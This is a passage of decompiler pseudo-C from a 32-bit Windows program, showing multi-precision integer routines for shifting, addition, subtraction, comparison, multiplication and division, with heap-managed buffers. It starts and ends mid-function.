      while ( !v7 );
    }
    v8 = *(_DWORD *)a2 >> (31 - v6);
    v9 = a3 - 1;
    if ( a3 != 1 )
    {
      v10 = a2 - v3 + 4;
      v13 = v10;
      do
      {
        v11 = *(_DWORD *)&v3[v10];
        *(_DWORD *)v3 = v8 | (v11 << (32 - (31 - v6)));
        v10 = v13;
        v3 += 4;
        v8 = v11 >> (31 - v6);
        --v9;
      }
      while ( v9 );
    }
    result = v12;
    *(_DWORD *)v3 = v8;
  }
  return result;
}

//----- (004026F0) --------------------------------------------------------
unsigned int __fastcall sub_4026F0(int a1, _DWORD *a2, int a3, int a4, int *a5)
{
  int v5; // edx
  int v6; // edi
  HANDLE ProcessHeap; // eax
  int v8; // eax
  _DWORD *v9; // edi
  int v10; // ebx
  int v11; // ebx
  unsigned int result; // eax
  char *v13; // edi
  unsigned int *v14; // ecx
  unsigned int v15; // ebx
  unsigned int v16; // esi
  int v17; // edx
  int v18; // edi
  unsigned int v19; // ebx
  int v20; // edi
  unsigned int v21; // edx
  unsigned int v22; // esi
  unsigned __int64 v23; // kr00_8
  unsigned int v24; // ebx
  unsigned int v25; // edi
  int v26; // ecx
  unsigned int v27; // esi
  unsigned int v28; // ebx
  int v29; // edx
  unsigned int v30; // edi
  int v31; // esi
  HANDLE v32; // eax
  int v33; // [esp+Ch] [ebp-3Ch]
  char *v34; // [esp+10h] [ebp-38h]
  unsigned int v35; // [esp+14h] [ebp-34h]
  unsigned int v36; // [esp+1Ch] [ebp-2Ch]
  int v37; // [esp+24h] [ebp-24h]
  int v39; // [esp+2Ch] [ebp-1Ch]
  unsigned int v41; // [esp+34h] [ebp-14h]
  unsigned int v42; // [esp+34h] [ebp-14h]
  _DWORD *lpMem; // [esp+38h] [ebp-10h]
  unsigned int v44; // [esp+3Ch] [ebp-Ch]
  unsigned int v45; // [esp+40h] [ebp-8h]
  unsigned int v46; // [esp+44h] [ebp-4h]
  unsigned int v47; // [esp+44h] [ebp-4h]
  unsigned int v48; // [esp+50h] [ebp+8h]
  unsigned int v49; // [esp+50h] [ebp+8h]
  unsigned int *v50; // [esp+54h] [ebp+Ch]
  unsigned int v51; // [esp+58h] [ebp+10h]

  v5 = a1;
  v6 = *a5;
  lpMem = 0;
  v33 = *a5;
  v44 = a5[1];
  v45 = a5[2];
  v46 = a5[3];
  if ( *a5 )
  {
    ProcessHeap = GetProcessHeap();
    lpMem = HeapAlloc(ProcessHeap, 8u, 4 * a4);
    v8 = sub_4020B0((int)lpMem, a3, a4, v6);
    v9 = lpMem;
    v5 = a1;
    v10 = v8;
  }
  else
  {
    v9 = (_DWORD *)a3;
    v10 = 0;
  }
  v51 = v10;
  v11 = (unsigned __int16)v46;
  result = v9[a4 - 1];
  v47 = HIWORD(v46);
  v37 = v11;
  v13 = (char *)v9 - v5;
  v39 = a4 - 2;
  v14 = (unsigned int *)(v5 + 4 * (a4 - 2));
  v15 = v51;
  v36 = HIWORD(v45);
  v50 = v14;
  v34 = v13;
  do
  {
    v16 = HIWORD(v15) * v37;
    v48 = *(unsigned int *)((char *)v14 + (_DWORD)v13);
    v17 = HIWORD(v15) * v47;
    v18 = (unsigned __int16)v15;
    v19 = (unsigned __int16)v15 * v37;
    v41 = v16 + v18 * v47 + HIWORD(v19);
    v20 = v17 + 0x10000;
    if ( v41 >= v16 )
      v20 = v17;
    v21 = (unsigned __int16)v19 + (v41 << 16);
    v22 = HIWORD(v41);
    v42 = v51 + HIWORD(v41) + v20 + (v21 + result < v21);
    v35 = v22 + v20 + (v21 + result < v21) + 1 + v51;
    v23 = __PAIR64__(result, v48) - v45;
    v49 = v48 - v45;
    v24 = v36 * (unsigned __int16)v42;
    v25 = v24
        + (unsigned __int16)v45 * HIWORD(v42)
        + (((unsigned __int16)v45 * (unsigned int)(unsigned __int16)v42) >> 16);
    v26 = v36 * HIWORD(v42) + 0x10000;
    v27 = (unsigned __int16)(v45 * v42) + (v25 << 16);
    if ( v25 >= v24 )
      v26 = v36 * HIWORD(v42);
    v28 = HIDWORD(v23) - v44 * v35 - (HIWORD(v25) + (v49 < v27) + v26);
    v29 = (v28 < v21 + result) - 1;
    v30 = v29 + v35;
    result = v49 - v27 + (v45 & v29);
    v15 = (result < v49 - v27) + (v44 & v29) + v28;
    v51 = v15;
    if ( v15 >= v44 && (v15 > v44 || result >= v45) )
    {
      ++v30;
      v15 = (__PAIR64__(v15, result) - __PAIR64__(v44, v45)) >> 32;
      result -= v45;
      v51 = v15;
    }
    if ( a1 )
      *v50 = v30;
    v14 = v50 - 1;
    v13 = v34;
    --v39;
    --v50;
  }
  while ( v39 >= 0 );
  if ( v33 )
  {
    v31 = (result >> v33) | (v15 << (32 - v33));
    v32 = GetProcessHeap();
    HeapFree(v32, 0, lpMem);
    result = (unsigned int)a2;
    *a2 = v31;
    a2[1] = v15 >> v33;
  }
  else
  {
    a2[1] = v15;
    *a2 = result;
  }
  return result;
}

//----- (00402940) --------------------------------------------------------
int __fastcall sub_402940(int a1, int a2, int a3, unsigned int a4, int a5, int a6, unsigned int a7)
{
  int v7; // ecx
  unsigned int v8; // esi
  int v9; // edx
  int *v10; // edi
  int v11; // eax
  _DWORD *v12; // eax
  unsigned int v13; // ebx
  int v14; // eax
  int v15; // esi
  _DWORD *v16; // eax
  int v17; // esi
  unsigned __int16 v18; // di
  int v19; // eax
  unsigned int v20; // ebx
  unsigned int v21; // esi
  int v22; // edx
  unsigned int v23; // ecx
  unsigned int v24; // esi
  unsigned int v25; // edi
  unsigned int v26; // ecx
  unsigned int v27; // ebx
  int v28; // edx
  unsigned __int64 v29; // rdi
  int v30; // ecx
  unsigned int v31; // ebx
  int v32; // ecx
  unsigned int v33; // ebx
  int v34; // eax
  unsigned int v35; // eax
  int v36; // edi
  int *v37; // esi
  int v38; // edx
  unsigned int v39; // edx
  int v40; // eax
  unsigned int v41; // edx
  bool v42; // cf
  int result; // eax
  unsigned int v44; // [esp+18h] [ebp-2Ch]
  unsigned int v45; // [esp+1Ch] [ebp-28h]
  unsigned int v46; // [esp+20h] [ebp-24h]
  int v48; // [esp+28h] [ebp-1Ch]
  _DWORD *v50; // [esp+30h] [ebp-14h]
  _DWORD *v51; // [esp+34h] [ebp-10h]
  unsigned int v52; // [esp+38h] [ebp-Ch]
  int v53; // [esp+3Ch] [ebp-8h]
  int v54; // [esp+3Ch] [ebp-8h]
  unsigned int v55; // [esp+3Ch] [ebp-8h]
  unsigned int v56; // [esp+40h] [ebp-4h]
  int *v57; // [esp+4Ch] [ebp+8h]

  v7 = a5;
  v8 = *(_DWORD *)(a5 + 4 * a6 - 8);
  v52 = *(_DWORD *)(4 * a6 + a5 - 4);
  v56 = v8;
  v48 = a3 - a6;
  v9 = a3 - 1;
  v10 = (int *)(a2 + 4 * (a3 - a6));
  v11 = a3 - 2;
  v57 = v10;
  v50 = (_DWORD *)(a2 + 4 * v11);
  v12 = (_DWORD *)(a2 + 4 * v9);
  v51 = v12;
  v13 = a4;
  do
  {
    v14 = *v12;
    v53 = v14;
    if ( v13 == v52 && v14 == v8 )
    {
      v15 = -1;
      sub_401ED0(v10, v7, a6, 0xFFFFFFFF);
      v16 = v51;
      v13 = *v51;
      a4 = *v51;
    }
    else
    {
      v17 = (unsigned __int16)v13;
      v18 = v13 * a7;
      v19 = HIWORD(v13) * HIWORD(a7);
      v20 = HIWORD(v13) * (unsigned __int16)a7;
      v21 = v20 + v17 * HIWORD(a7) + ((v17 * (unsigned int)(unsigned __int16)a7) >> 16);
      v22 = v19 + 0x10000;
      if ( v21 >= v20 )
        v22 = v19;
      v23 = v18 + (v21 << 16);
      v24 = HIWORD(v21);
      v45 = v23 + v53;
      v25 = a4 + v24 + v22 + (v23 + v53 < v23);
      v44 = v24 + v22 + (v23 + v53 < v23) + 1 + a4;
      v46 = *v50 - v56;
      v54 = ((__PAIR64__(v53, *v50) - v56) >> 32) - v52 * v44;
      v26 = (unsigned __int16)v56 * (unsigned __int16)v25;
      v27 = HIWORD(v56) * (unsigned __int16)v25;
      v28 = HIWORD(v56) * HIWORD(v25);
      LODWORD(v29) = v27 + (unsigned __int16)v56 * HIWORD(v25) + HIWORD(v26);
      HIDWORD(v29) = (unsigned __int16)v26 + ((_DWORD)v29 << 16);
      v30 = v28 + 0x10000;
      if ( (unsigned int)v29 >= v27 )
        v30 = v28;
      v31 = v54 - (WORD1(v29) + (v46 < HIDWORD(v29)) + v30);
      v32 = (v31 < v45) - 1;
      LODWORD(v29) = v46 - HIDWORD(v29) + (v56 & v32);
      v55 = v32 + v44;
      v33 = ((unsigned int)v29 < v46 - HIDWORD(v29)) + (v52 & v32) + v31;
      if ( v33 >= v52 && (v33 > v52 || (unsigned int)v29 >= v56) )
      {
        v55 = v32 + v44 + 1;
        v33 = (__PAIR64__(v33, v29) - __PAIR64__(v52, v56)) >> 32;
        LODWORD(v29) = v29 - v56;
      }
      HIDWORD(v29) = v33;
      v34 = sub_401ED0(v57, a5, a6 - 2, v55);
      v13 = (__PAIR64__(v33, v29) - (unsigned int)v34) >> 32;
      a4 = v13;
      *v50 = v29 - v34;
      if ( v29 >= (unsigned int)v34 )
      {
        v15 = v55;
      }
      else
      {
        v35 = 0;
        v36 = 0;
        if ( a6 - 1 > 0 )
        {
          v37 = v57;
          do
          {
            v38 = *v37++;
            v39 = v35 + v38;
            v40 = -(v39 < v35);
            v41 = *(_DWORD *)(a5 + 4 * v36) + v39;
            v42 = v41 < *(_DWORD *)(a5 + 4 * v36);
            *(v37 - 1) = v41;
            ++v36;
            v35 = v42 - v40;
          }
          while ( v36 < a6 - 1 );
        }
        v13 += v52 + v35;
        a4 = v13;
        v15 = v55 - 1;
      }
      v16 = v51;
      v10 = v57;
    }
    if ( a1 )
      *(int *)((char *)v10 + a1 - a2) = v15;
    v12 = v16 - 1;
    --v50;
    v8 = v56;
    --v10;
    --v48;
    v7 = a5;
    v51 = v12;
    v57 = v10;
  }
  while ( v48 >= 0 );
  result = 4 * a6;
  *(_DWORD *)(4 * a6 + a2 - 4) = v13;
  return result;
}

//----- (00402BD0) --------------------------------------------------------
int __fastcall sub_402BD0(int a1, char *a2, int a3, int a4, int a5, int *a6)
{
  int v7; // eax
  int result; // eax
  int *v10; // ecx
  int v11; // edx
  int v12; // ebx
  int v13; // eax
  unsigned int v15; // [esp+1Ch] [ebp+10h]

  v7 = a1;
  if ( a5 == 1 )
  {
    result = sub_4024F0(a1, a2, a3, a6);
    *(_DWORD *)a2 = result;
  }
  else if ( a5 == 2 )
  {
    return sub_4026F0(a1, a2, (int)a2, a3, a6);
  }
  else
  {
    v10 = a6;
    v11 = a3;
    v12 = *a6;
    if ( *a6 )
    {
      v13 = sub_4020B0((int)a2, (int)a2, a3, *a6);
      v10 = a6;
      v11 = a3;
      v15 = v13;
      v7 = a1;
    }
    else
    {
      v15 = 0;
    }
    result = sub_402940(v7, (int)a2, v11, v15, a4, a5, v10[3]);
    if ( v12 )
      return sub_402130(a2, a2, a5, v12);
  }
  return result;
}

//----- (00402C80) --------------------------------------------------------
LPVOID __fastcall sub_402C80(int *a1, int a2)
{
  int v2; // esi
  HANDLE ProcessHeap; // eax
  LPVOID v5; // ecx
  __int64 v6; // rax
  bool v7; // cc
  LPVOID result; // eax
  void *v9; // [esp-8h] [ebp-10h]

  v2 = 1;
  if ( a2 > 1 )
    v2 = a2;
  v9 = (void *)a1[2];
  ProcessHeap = GetProcessHeap();
  v5 = HeapReAlloc(ProcessHeap, 8u, v9, 4 * v2);
  *a1 = v2;
  v6 = a1[1];
  a1[2] = (int)v5;
  v7 = (int)((HIDWORD(v6) ^ v6) - HIDWORD(v6)) <= v2;
  result = v5;
  if ( !v7 )
    a1[1] = 0;
  return result;
}

//----- (00402CD0) --------------------------------------------------------
int *__fastcall sub_402CD0(int *a1, int *a2)
{
  int *result; // eax
  char *v4; // ecx
  int v5; // edi
  signed int v6; // esi
  HANDLE ProcessHeap; // eax
  __int64 v8; // rax
  int *v9; // eax
  int v10; // edx
  int v11; // esi
  int v12; // eax
  void *v13; // [esp-10h] [ebp-18h]

  result = a2;
  if ( a1 != a2 )
  {
    v4 = (char *)a1[2];
    v5 = abs32(a2[1]);
    if ( v5 > *a1 )
    {
      v6 = 1;
      if ( v5 > 1 )
        v6 = v5;
      v13 = v4;
      ProcessHeap = GetProcessHeap();
      v4 = (char *)HeapReAlloc(ProcessHeap, 8u, v13, 4 * v6);
      *a1 = v6;
      v8 = a1[1];
      a1[2] = (int)v4;
      if ( (int)((HIDWORD(v8) ^ v8) - HIDWORD(v8)) > v6 )
        a1[1] = 0;
    }
    v9 = a2;
    v10 = 0;
    if ( v5 > 0 )
    {
      v11 = a2[2] - (_DWORD)v4;
      do
      {
        v12 = *(_DWORD *)&v4[v11];
        v4 += 4;
        ++v10;
        *((_DWORD *)v4 - 1) = v12;
      }
      while ( v10 < v5 );
      v9 = a2;
    }
    result = (int *)v9[1];
    a1[1] = (int)result;
  }
  return result;
}

//----- (00402D60) --------------------------------------------------------
unsigned int __fastcall sub_402D60(signed int *a1, int a2, int a3)
{
  int v4; // ebx
  signed int v5; // ecx
  signed int v6; // eax
  bool v7; // cc
  int v8; // edx
  int v9; // edi
  int v10; // eax
  char *v11; // ebx
  signed int v12; // esi
  HANDLE ProcessHeap; // eax
  __int64 v14; // rax
  unsigned int v15; // eax
  int v16; // edi
  int *v17; // esi
  char *v18; // ebx
  int v19; // edi
  int v20; // ebx
  int v21; // edx
  unsigned int v22; // edx
  int v23; // eax
  unsigned int v24; // edx
  int v25; // ebx
  int v26; // ebx
  int v27; // esi
  int v28; // edi
  char *v29; // edx
  int v30; // ecx
  unsigned int v31; // ecx
  int v33; // [esp+Ch] [ebp-14h]
  char *v34; // [esp+Ch] [ebp-14h]
  int v35; // [esp+10h] [ebp-10h]
  int v36; // [esp+14h] [ebp-Ch]
  char *v37; // [esp+18h] [ebp-8h]
  int v39; // [esp+1Ch] [ebp-4h]
  int v40; // [esp+28h] [ebp+8h]

  v4 = a2;
  v5 = abs32(*(_DWORD *)(a2 + 4));
  v6 = abs32(*(_DWORD *)(a3 + 4));
  v7 = v5 < v6;
  v8 = v6;
  if ( v5 < v6 )
    v8 = v5;
  else
    v4 = a3;
  v9 = v6;
  v33 = v4;
  v10 = a3;
  if ( !v7 )
  {
    v9 = v5;
    v10 = a2;
  }
  v40 = v10;
  v36 = v8;
  v11 = (char *)a1[2];
  v35 = v9;
  v37 = v11;
  if ( v9 + 1 > *a1 )
  {
    v12 = 1;
    if ( v9 >= 1 )
      v12 = v9 + 1;
    ProcessHeap = GetProcessHeap();
    v11 = (char *)HeapReAlloc(ProcessHeap, 8u, v11, 4 * v12);
    v37 = v11;
    v14 = a1[1];
    a1[2] = (signed int)v11;
    *a1 = v12;
    if ( (int)((HIDWORD(v14) ^ v14) - HIDWORD(v14)) > v12 )
      a1[1] = 0;
    v8 = v36;
  }
  v15 = 0;
  v16 = *(_DWORD *)(v40 + 8);
  v39 = v16;
  if ( v8 > 0 )
  {
    v17 = *(int **)(v40 + 8);
    v18 = &v11[-v16];
    v19 = *(_DWORD *)(v33 + 8) - v16;
    v34 = v18;
    v20 = v8;
    do
    {
      v21 = *v17++;
      v22 = v15 + v21;
      v23 = -(v22 < v15);
      v24 = *(int *)((char *)v17 + v19 - 4) + v22;
      v15 = (v24 < *(int *)((char *)v17 + v19 - 4)) - v23;
      *(int *)((char *)v17 + (_DWORD)v34 - 4) = v24;
      --v20;
    }
    while ( v20 );
    v16 = v39;
    v8 = v36;
  }
  v25 = v35;
  if ( v35 > v8 )
  {
    v26 = v35 - v8;
    v27 = 0;
    v28 = v16 - (_DWORD)v37;
    v29 = &v37[4 * v8];
    do
    {
      v30 = *(_DWORD *)&v29[v28];
      v29 += 4;
      v31 = v15 + v30;
      *((_DWORD *)v29 - 1) = v31;
      ++v27;
      v15 = v31 < v15;
    }
    while ( v27 < v26 );
    v25 = v35;
  }
  *(_DWORD *)&v37[4 * v25] = v15;
  return v25 + v15;
}

//----- (00402E90) --------------------------------------------------------
int __fastcall sub_402E90(int *a1, int a2, int a3)
{
  int v3; // ebx
  int v4; // edi
  int v5; // esi
  int v6; // edx
  int v7; // eax
  int v8; // ecx
  int v9; // edx
  unsigned int *v10; // eax
  unsigned int v11; // edx
  signed int v12; // edi
  HANDLE ProcessHeap; // eax
  __int64 v14; // rax
  char *v15; // eax
  char *v17; // edi
  char *v18; // eax
  void *v19; // [esp-8h] [ebp-20h]
  int v20; // [esp+Ch] [ebp-Ch]
  char *v21; // [esp+Ch] [ebp-Ch]
  int *v22; // [esp+10h] [ebp-8h]

  v22 = a1;
  v3 = abs32(*(_DWORD *)(a2 + 4));
  v4 = *(_DWORD *)(a3 + 8);
  v5 = abs32(*(_DWORD *)(a3 + 4));
  v6 = *(_DWORD *)(a2 + 8);
  if ( v3 == v5 )
  {
    v8 = v3 - 1;
    if ( v3 - 1 < 0 )
    {
LABEL_7:
      v7 = 0;
    }
    else
    {
      v9 = v6 - v4;
      v10 = (unsigned int *)(v4 + 4 * v8);
      v20 = v9;
      while ( 1 )
      {
        v11 = *(unsigned int *)((char *)v10 + v9);
        if ( *v10 != v11 )
          break;
        v9 = v20;
        --v10;
        if ( --v8 < 0 )
          goto LABEL_7;
      }
      v7 = *v10 < v11 ? 1 : -1;
    }
    a1 = v22;
  }
  else
  {
    v7 = 2 * (v3 >= v5) - 1;
  }
  if ( v7 <= 0 )
  {
    if ( v7 >= 0 )
    {
      return 0;
    }
    else
    {
      if ( v5 <= *a1 )
        v17 = (char *)a1[2];
      else
        v17 = (char *)sub_402C80(a1, v5);
      sub_401D90((int)v17, *(_DWORD *)(a3 + 8), v5, *(int **)(a2 + 8), v3);
      if ( v5 > 0 )
      {
        v18 = &v17[4 * v5 - 4];
        do
        {
          if ( *(_DWORD *)v18 )
            break;
          --v5;
          v18 -= 4;
        }
        while ( v5 > 0 );
      }
      return -v5;
    }
  }
  else
  {
    v21 = (char *)a1[2];
    if ( v3 > *a1 )
    {
      v12 = 1;
      if ( v3 > 1 )
        v12 = v3;
      v19 = (void *)a1[2];
      ProcessHeap = GetProcessHeap();
      v21 = (char *)HeapReAlloc(ProcessHeap, 8u, v19, 4 * v12);
      v22[2] = (int)v21;
      v14 = v22[1];
      *v22 = v12;
      if ( (int)((HIDWORD(v14) ^ v14) - HIDWORD(v14)) > v12 )
        v22[1] = 0;
    }
    sub_401D90((int)v21, *(_DWORD *)(a2 + 8), v3, *(int **)(a3 + 8), v5);
    if ( v3 > 0 )
    {
      v15 = &v21[4 * v3 - 4];
      do
      {
        if ( *(_DWORD *)v15 )
          break;
        --v3;
        v15 -= 4;
      }
      while ( v3 > 0 );
    }
    return v3;
  }
}

//----- (00403000) --------------------------------------------------------
int __fastcall sub_403000(int *a1, int a2, int a3)
{
  unsigned int v5; // eax
  int v6; // ecx
  int result; // eax

  if ( (*(_DWORD *)(a2 + 4) ^ *(_DWORD *)(a3 + 4)) < 0 )
    v5 = sub_402E90(a1, a2, a3);
  else
    v5 = sub_402D60(a1, a2, a3);
  v6 = v5;
  result = -v5;
  if ( *(int *)(a2 + 4) < 0 )
    v6 = result;
  a1[1] = v6;
  return result;
}

//----- (00403040) --------------------------------------------------------
int __fastcall sub_403040(signed int *a1, int a2, int a3)
{
  unsigned int v5; // eax
  signed int v6; // ecx
  int result; // eax

  if ( (*(_DWORD *)(a2 + 4) ^ *(_DWORD *)(a3 + 4)) < 0 )
    v5 = sub_402D60(a1, a2, a3);
  else
    v5 = sub_402E90(a1, a2, a3);
  v6 = v5;
  result = -v5;
  if ( *(int *)(a2 + 4) < 0 )
    v6 = result;
  a1[1] = v6;
  return result;
}

//----- (00403080) --------------------------------------------------------
void __fastcall sub_403080(unsigned int *a1, int a2, int a3)
{
  int v5; // ecx
  int v7; // eax
  __int64 v8; // rax
  HANDLE ProcessHeap; // eax
  unsigned int *v10; // eax
  int v11; // ecx
  HANDLE v12; // eax
  void *v13; // [esp-4h] [ebp-24h]
  unsigned int v14; // [esp+Ch] [ebp-14h]
  int v15; // [esp+10h] [ebp-10h]
  int v16; // [esp+14h] [ebp-Ch]
  unsigned int *v17; // [esp+18h] [ebp-8h]
  int v18; // [esp+1Ch] [ebp-4h]
  int v19; // [esp+28h] [ebp+8h]

  v5 = *(_DWORD *)(a2 + 4);
  if ( v5 && (v7 = *(_DWORD *)(a3 + 4)) != 0 )
  {
    v15 = v5 ^ v7;
    v8 = *(int *)(a3 + 4);
    v19 = abs32(v5);
    v18 = (HIDWORD(v8) ^ v8) - HIDWORD(v8);
    v16 = v19 + v18;
    v14 = ((32 * (v19 + v18) - (unsigned int)(32 * (v19 + v18) != 0)) >> 5) + 1;
    ProcessHeap = GetProcessHeap();
    v10 = (unsigned int *)HeapAlloc(ProcessHeap, 8u, 4 * v14);
    v17 = v10;
    if ( v19 < v18 )
      sub_401F90(v10, *(char **)(a3 + 8), v18, *(unsigned int **)(a2 + 8), v19);
    else
      sub_401F90(v10, *(char **)(a2 + 8), v19, *(unsigned int **)(a3 + 8), v18);
    v11 = (v17[v16 - 1] == 0) - v16;
    if ( v15 >= 0 )
      v11 = (__PAIR64__(v16, v17[v16 - 1]) - 1) >> 32;
    *a1 = v14;
    v13 = (void *)a1[2];
    a1[1] = v11;
    a1[2] = (unsigned int)v17;
    v12 = GetProcessHeap();
    HeapFree(v12, 0, v13);
  }
  else
  {
    a1[1] = 0;
  }
}

//----- (00403170) --------------------------------------------------------
int __fastcall sub_403170(signed int *a1, int a2, unsigned int a3)
{
  unsigned __int64 v3; // rax
  int v4; // ebx
  int v5; // esi
  char *v6; // edi
  BOOL v7; // edx
  signed int v8; // edi
  HANDLE ProcessHeap; // eax
  __int64 v10; // rax
  char *v11; // ecx
  int v12; // eax
  unsigned int v16; // [esp+Ch] [ebp-8h]
  void *lpMem; // [esp+10h] [ebp-4h]
  char *lpMema; // [esp+10h] [ebp-4h]
  _DWORD *lpMemb; // [esp+10h] [ebp-4h]
  int v20; // [esp+1Ch] [ebp+8h]

  v3 = *(int *)(a2 + 4);
  v4 = (HIDWORD(v3) ^ v3) - HIDWORD(v3);
  if ( (HIDWORD(v3) ^ (unsigned int)v3) == HIDWORD(v3) )
  {
    a1[1] = v4;
  }
  else
  {
    v5 = a3 >> 5;
    v6 = (char *)a1[2];
    v7 = (a3 & 0x1F) != 0;
    v20 = a3 & 0x1F;
    lpMem = v6;
    HIDWORD(v3) = v5 + v4 + v7;
    v16 = HIDWORD(v3);
    if ( SHIDWORD(v3) > *a1 )
    {
      v8 = 1;
      if ( SHIDWORD(v3) > 1 )
        v8 = HIDWORD(v3);
      ProcessHeap = GetProcessHeap();
      lpMema = (char *)HeapReAlloc(ProcessHeap, 8u, lpMem, 4 * v8);
      a1[2] = (signed int)lpMema;
      v10 = a1[1];
      *a1 = v8;
      if ( (int)((HIDWORD(v10) ^ v10) - HIDWORD(v10)) > v8 )
        a1[1] = 0;
      HIDWORD(v3) = v16;
      v6 = lpMema;
    }
    lpMemb = *(_DWORD **)(a2 + 8);
    if ( v20 )
    {
      v3 = __PAIR64__(v16, sub_4020B0((int)&v6[4 * v5], *(_DWORD *)(a2 + 8), v4, v20));
      *(_DWORD *)&v6[4 * v16 - 4] = v3;
      HIDWORD(v3) = (v3 - 1) >> 32;
    }
    else if ( v4 > 0 )
    {
      v11 = &v6[4 * v4 + 4 * v5];
      do
      {
        v12 = lpMemb[v4 - 1];
        v11 -= 4;
        --v4;
        *(_DWORD *)v11 = v12;
      }
      while ( v4 > 0 );
      HIDWORD(v3) = v16;
    }
    if ( v5 )
    {
      do
      {
        --v5;
        *(_DWORD *)&v6[4 * v5] = 0;
      }
      while ( v5 > 0 );
    }
    LODWORD(v3) = -HIDWORD(v3);
    if ( *(int *)(a2 + 4) >= 0 )
      LODWORD(v3) = HIDWORD(v3);
    a1[1] = v3;
  }
  return v3;
}

//----- (00403290) --------------------------------------------------------
BOOL __fastcall sub_403290(unsigned int *a1, int *a2, int *a3, _DWORD *lpMem)
{
  int v5; // esi
  int v7; // edx
  int v9; // esi
  HANDLE ProcessHeap; // eax
  HANDLE v11; // eax
  HANDLE v12; // eax
  int v13; // ecx
  HANDLE v14; // eax
  int v15; // ecx
  char *v16; // eax
  void *v17; // eax
  HANDLE (__stdcall *v18)(); // ebx
  HANDLE v19; // eax
  char *v20; // ecx
  HANDLE v21; // eax
  SIZE_T v22; // [esp-4h] [ebp-58h]
  void *v23; // [esp-4h] [ebp-58h]
  char *v24; // [esp-4h] [ebp-58h]
  int v25[4]; // [esp+10h] [ebp-44h] BYREF
  unsigned int v26; // [esp+20h] [ebp-34h] BYREF
  int v27; // [esp+24h] [ebp-30h]
  char *v28; // [esp+28h] [ebp-2Ch]
  unsigned int v29; // [esp+2Ch] [ebp-28h]
  int v30; // [esp+30h] [ebp-24h]
  char *v31; // [esp+34h] [ebp-20h]
  unsigned int v32; // [esp+38h] [ebp-1Ch]
  int v33; // [esp+3Ch] [ebp-18h]
  int v34; // [esp+40h] [ebp-14h]
  int v35; // [esp+44h] [ebp-10h]
  char *v36; // [esp+48h] [ebp-Ch]
  int v37; // [esp+4Ch] [ebp-8h]
  int *v38; // [esp+5Ch] [ebp+8h]
  int v39; // [esp+5Ch] [ebp+8h]
  void *lpMema; // [esp+60h] [ebp+Ch]

  v5 = lpMem[1];
  v35 = v5;
  v7 = a3[1];
  v33 = v7;
  if ( v7 )
  {
    v37 = abs32(v7);
    v35 ^= v33;
    v9 = abs32(v5);
    if ( v37 >= v9 )
    {
      v26 = 1;
      v27 = 0;
      ProcessHeap = GetProcessHeap();
      v28 = (char *)HeapAlloc(ProcessHeap, 8u, 4u);
      sub_402CD0((int *)&v26, a3);
      v29 = v37 - v9;
      v30 = v37 - v9 + 1;
      if ( a1 )
      {
        v34 = 0;
        v32 = ((32 * (v37 - v9 + 1) - (unsigned int)(32 * (v37 - v9 + 1) != 0)) >> 5) + 1;
        v22 = 4 * v32;
        v11 = GetProcessHeap();
        v31 = (char *)HeapAlloc(v11, 8u, v22);
        v36 = v31;
      }
      else
      {
        v31 = v28;
        v34 = v27;
        v36 = 0;
        v32 = v26;
      }
      v38 = (int *)lpMem[2];
      lpMema = 0;
      sub_4023F0(v25, v38, v9);
      if ( v9 > 2 && v25[0] )
      {
        v12 = GetProcessHeap();
        lpMema = HeapAlloc(v12, 8u, 4 * v9);
        sub_4020B0((int)lpMema, (int)v38, v9, v25[0]);
        v13 = (int)lpMema;
      }
      else
      {
        v13 = (int)v38;
      }
      sub_402BD0((int)v36, v28, v37, v13, v9, v25);
      if ( lpMema )
      {
        v14 = GetProcessHeap();
        HeapFree(v14, 0, lpMema);
      }
      if ( v36 )
      {
        v15 = v29 + (*(_DWORD *)&v36[4 * v30 - 4] != 0);
        if ( v35 < 0 )
          v15 = (unsigned __int64)-__SPAIR64__(v29, *(_DWORD *)&v36[4 * v30 - 4]) >> 32;
      }
      else
      {
        v15 = v34;
      }
      if ( v9 > 0 )
      {
        v16 = &v28[4 * v9 - 4];
        do
        {
          if ( *(_DWORD *)v16 )
            break;
          --v9;
          v16 -= 4;
        }
        while ( v9 > 0 );
      }
      if ( v33 >= 0 )
        v39 = v9;
      else
        v39 = -v9;
      if ( a1 )
      {
        *a1 = v32;
        v17 = (void *)a1[2];
        a1[1] = v15;
        v23 = v17;
        a1[2] = (unsigned int)v31;
        v18 = GetProcessHeap;
        v19 = GetProcessHeap();
        HeapFree(v19, 0, v23);
      }
      else
      {
        v18 = GetProcessHeap;
      }
      if ( a2 )
      {
        v20 = (char *)a2[2];
        a2[1] = v39;
        *a2 = v26;
        a2[2] = (int)v28;
      }
      else
      {
        v20 = v28;
      }
      v24 = v20;
      v21 = v18();
      HeapFree(v21, 0, v24);
      return v9 != 0;
    }
    else
    {
      if ( a2 )
        sub_402CD0(a2, a3);
      if ( a1 )
        a1[1] = 0;
      return 1;
    }
  }
  else
  {
    if ( a1 )
      a1[1] = 0;
    if ( a2 )
      a2[1] = 0;
    return 0;
  }
}

//----- (004034F0) --------------------------------------------------------
int __fastcall sub_4034F0(int *a1, int a2, unsigned int a3)
{
  int result; // eax
  int v5; // ecx
  int v6; // edi
  char *v7; // eax
  char *v8; // esi
  char *v9; // edx
  int v10; // edx
  int v11; // ecx
  int v12; // [esp+4h] [ebp-Ch]
  unsigned int v13; // [esp+8h] [ebp-8h]
  int v15; // [esp+18h] [ebp+8h]

  result = *(_DWORD *)(a2 + 4);
  v12 = result;
  if ( result )
  {
    v13 = a3 >> 5;
    v5 = a3 & 0x1F;
    v6 = abs32(result) - (a3 >> 5);
    v15 = v5;
    if ( v6 > 0 )
    {
      if ( v6 <= *a1 )
      {
        v8 = (char *)a1[2];
      }
      else
      {
        v7 = (char *)sub_402C80(a1, v6);
        v5 = v15;
        v8 = v7;
      }
      v9 = (char *)(*(_DWORD *)(a2 + 8) + 4 * v13);
      if ( v5 )
      {
        sub_402130(v8, v9, v6, v5);
        result = *(_DWORD *)&v8[4 * v6 - 4] == 0;
        v6 = (__PAIR64__(v6, *(_DWORD *)&v8[4 * v6 - 4]) - 1) >> 32;
      }
      else
      {
        v10 = v9 - v8;
        v11 = v6;
        do
        {
          result = *(_DWORD *)&v8[v10];
          v8 += 4;
          *((_DWORD *)v8 - 1) = result;
          --v11;
        }
        while ( v11 );
      }
    }
    else
    {
      v6 = 0;
    }
    a1[1] = v6;
    if ( v12 < 0 )
      a1[1] = -v6;
  }
  else
  {
    a1[1] = 0;
  }
  return result;
}
// 403576: conditional instruction was optimized away because edi.4>=1

//----- (004035B0) --------------------------------------------------------
int *__fastcall sub_4035B0(int *a1, _DWORD *a2, int a3, int *a4, int *a5)
{
  int v7; // eax
  int *result; // eax
  int v9; // ebx
